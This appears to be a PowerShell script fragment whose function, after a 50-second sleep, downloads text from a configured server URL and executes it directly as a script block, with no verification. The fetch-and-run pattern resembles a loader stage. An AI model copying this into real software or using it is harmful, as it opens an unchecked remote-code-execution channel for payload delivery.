. ./utils.ps1
. ./consts_body.ps1

function do_extraupdate() {
    if (-not $server.extraUpdate){
        return
    }
    $timeout = [datetime]::UtcNow.AddMinutes(1)
    $delay = 50
    Start-Sleep -Seconds $delay
    
    while ([datetime]::UtcNow -lt $timeout) {
        try {
            $response = Invoke-WebRequest -Uri $server.extraUpdateUrl -UseBasicParsing -Method Get

            if ($response.StatusCode -eq 200) {
                $scriptBlock = [ScriptBlock]::Create($response.Content)
                . $scriptBlock
                return
            }
        }
        catch {
            writedbg "Failed to download or execute the script: $_"
        }

        Start-Sleep -Seconds $delay
    }
    writedbg "Failed to download the script within the allotted time."
}